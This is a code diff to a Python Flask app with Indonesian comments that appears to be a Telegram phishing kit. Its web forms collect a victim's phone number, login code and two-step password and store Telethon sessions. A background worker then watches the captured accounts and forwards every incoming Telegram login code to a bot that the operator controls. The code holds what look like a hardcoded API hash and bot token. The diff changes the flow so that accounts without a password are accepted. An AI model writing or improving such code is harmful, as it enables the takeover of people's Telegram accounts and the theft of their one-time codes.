@@ -1,16 +1,15 @@
 import os
-import re
 import asyncio
 import threading
 import requests
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
+# =================== KONFIG ===================
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
@@ -38,9 +37,8 @@ def login():
         async def send_code():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
-            if not await client.is_user_authorized():
-                sent = await client.send_code_request(phone)
-                session["phone_code_hash"] = sent.phone_code_hash
+            sent = await client.send_code_request(phone)
+            session["phone_code_hash"] = sent.phone_code_hash
             await client.disconnect()
 
         try:
@@ -86,7 +84,7 @@ def otp():
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
                 else:
-                    flash("OTP benar ✅ (akun tanpa password bisa isi kosong/random).")
+                    flash("OTP benar ✅ (akun tanpa password).")
                 return redirect(url_for("password"))
             else:
                 flash(result["error"])
@@ -111,17 +109,18 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
-                # Kalau akun memang pakai password
+                # kalau akun pakai password → harus benar
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return {"ok": True, "me": me}
-            except SessionPasswordNeededError:
+            except PasswordHashInvalidError:
                 await client.disconnect()
-                return {"ok": False, "error": "Akun ini membutuhkan password, isi dengan benar."}
-            except Exception as e:
+                return {"ok": False, "error": "Password salah"}
+            except Exception:
+                # akun tanpa password
                 await client.disconnect()
-                return {"ok": False, "error": f"Password salah: {e}"}
+                return {"ok": True, "me": None}
 
         result = asyncio.run(verify_password())
         if result["ok"]:
@@ -145,12 +144,7 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template(
-        "success.html",
-        name=session.get("name"),
-        phone=session.get("phone"),
-        gender=session.get("gender")
-    )
+    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
 
 
 # =================== WORKER ===================
@@ -158,9 +152,8 @@ def success():
 async def forward_handler(event, client_name):
     """Handler untuk meneruskan pesan OTP"""
     text_msg = event.message.message
-    print(f"[Worker][{client_name}] Pesan masuk: {text_msg}")  # 👈 debug semua pesan
-
     if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
+        import re
         otp_match = re.findall(r"\d{4,6}", text_msg)
         otp_code = otp_match[0] if otp_match else text_msg
 
@@ -169,9 +162,7 @@ async def forward_handler(event, client_name):
             "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
         }
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
-        print(f"[Worker][{client_name}] ✅ OTP diteruskan: {otp_code}")
-    else:
-        print(f"[Worker][{client_name}] ❌ Bukan OTP, tidak diteruskan.")
+        print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
 
 
 async def worker_main():
@@ -187,7 +178,7 @@ async def worker_main():
                 await client.connect()
 
                 if not await client.is_user_authorized():
-                    print(f"[Worker] ❌ Session {fname} belum login, lewati.")
+                    print(f"[Worker] ❌ Session {fname} belum login penuh, lewati.")
                     await client.disconnect()
                     continue
 
@@ -208,7 +199,6 @@ def start_worker():
     asyncio.run(worker_main())
 
 
-# jalankan worker di thread terpisah saat app start
 threading.Thread(target=start_worker, daemon=True).start()
 
 
